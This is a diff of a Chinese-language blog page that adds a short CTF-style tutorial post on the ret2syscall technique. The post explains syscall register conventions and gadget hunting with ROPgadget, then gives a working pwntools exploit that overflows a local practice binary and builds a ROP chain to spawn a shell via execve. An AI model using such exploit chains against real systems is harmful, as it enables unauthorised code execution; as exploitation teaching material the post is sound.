@@ -155,6 +155,89 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/10/30/ret2syscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/10/30/ret2syscall/" class="post-title-link" itemprop="url">ret2syscall</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-10-30 11:26:22 / 修改时间：12:07:04" itemprop="dateCreated datePublished" datetime="2021-10-30T11:26:22+08:00">2021-10-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscall即利用程序中的gadget控制寄存器参数后执行系统调用，从而获得shell</p>
+<p>知识点</p>
+<ul>
+<li><p>32位平台系统调用使用”int 80”，64位平台系统调用使用”syscall”</p>
+<p>同时32位和64位平台的系统调用函数的调用号不一样，使用的时候最好先查一下</p>
+</li>
+<li><p>32位的系统调用号放在eax 传参依次是 EBX、ECX、EDX、ESI、EDI、EBP</p>
+<p>64位的系统调用号放在rax 传参依次是 RDI、RSI、RDX、R10、R8、R9 （和64位函数传参一样）</p>
+</li>
+</ul>
+<p>system(“/bin/sh”)实际上是execve(“/bin/sh”,0,0)的一个集成，实际上前者最终也是调用了后者获得的shell</p>
+<p>在进行系统调用之前需要为用到的寄存器赋值，在进行系统调用后才能正常调用函数，这里就需要通过程序中的gadget来控制寄存器参数</p>
+<p>思路</p>
+<ul>
+<li>在栈溢出的基础上通过一系列的pop|ret指令来构成ROP链为目标寄存器赋上对应的值，然后执行系统调用即可</li>
+</ul>
+<h4 id="一道简单的例题"><a href="#一道简单的例题" class="headerlink" title="一道简单的例题"></a>一道简单的例题</h4><img src="/2021/10/30/ret2syscall/%E4%BE%8B%E9%A2%98.jpg" class>
+
+<p>通过<code>ROPgadget --binary 文件名 --only &quot;pop|ret&quot;</code>以及</p>
+<p><code>ROPgadget --binary 文件名 --only &quot;syscall|ret&quot;</code>来找到相应寄存器和syscall的地址</p>
+<p>在64位平台中，execve的系统调用号是59，三个参数先后分别为”/bin/sh”，”0”，”0”。</p>
+<p>所以需要为rax赋上59，为rdi、rsi、rdx赋上”/bin/sh”，”0”，”0”。</p>
+<p>exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./poc&quot;)</span><br><span class="line"></span><br><span class="line">pop_rax_rdx_rbx_ret=0x478a76</span><br><span class="line">pop_rdi_ret=0x401676</span><br><span class="line">pop_rsi_ret=0x401797</span><br><span class="line">binsh_addr=0x4A15A4</span><br><span class="line">syscall_addr=0x4003da</span><br><span class="line"></span><br><span class="line">payload=&quot;A&quot;*0x18+p64(pop_rdi_ret)+p64(binsh_addr) 		 #rdi=binsh_addr</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0)						 #rsi=0</span><br><span class="line">payload+=p64(pop_rax_rdx_rbx_ret)+p64(59)+p64(0)+p64(0)	 # rax=59 rdx=0</span><br><span class="line">payload+=p64(syscall_addr) #execve(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">p.sendlineafter(&quot;show syscall?\n&quot;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/10/29/ret2libc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -436,7 +519,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
